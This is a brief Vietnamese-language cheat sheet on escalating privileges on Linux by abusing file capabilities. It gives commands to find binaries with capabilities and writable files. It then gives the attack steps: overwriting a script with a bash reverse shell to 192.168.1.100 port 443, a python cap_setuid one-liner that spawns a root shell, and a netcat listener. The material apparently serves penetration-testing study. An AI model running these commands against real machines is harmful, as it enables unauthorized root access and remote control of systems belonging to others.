# Capabilities

## Điểm chính khai thác

* File thực thi được gán khả năng Linux cấp đặc quyền cụ thể, cho phép thay đổi UID hoặc thực thi shell với quyền root mà không cần toàn bộ quyền quản trị.
* Thực thi mã hoặc mở shell với quyền root, dẫn đến nâng quyền từ người dùng thường lên quản trị.
* Chạy file thực thi có capabilities hoặc file lệnh được gán khả năng đặc quyền, cho phép thực thi các hành động vượt quá quyền hạn thông thường.

## Các bước khai thác

### Kiểm tra lỗ hổng

Kiểm tra tệp có Linux Capabilities:

```
getcap -r / 2>/dev/null
```

Kiểm tra quyền truy cập tập lệnh/thư mục:

```
find / -writable -type f 2>/dev/null
```

### Thực thi khai thác

Ghi đè tập lệnh có thể ghi:

```
echo '/bin/bash -i >& /dev/tcp/192.168.1.100/443 0>&1' > <file>
```

Khai thác khả năng cap\_setuid:

```
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Kích hoạt tập lệnh đã ghi đè:

```
./<file>
```

Chờ kết nối reverse shell sau khi tác vụ thực thi:

```
nc -lvnp 443
```
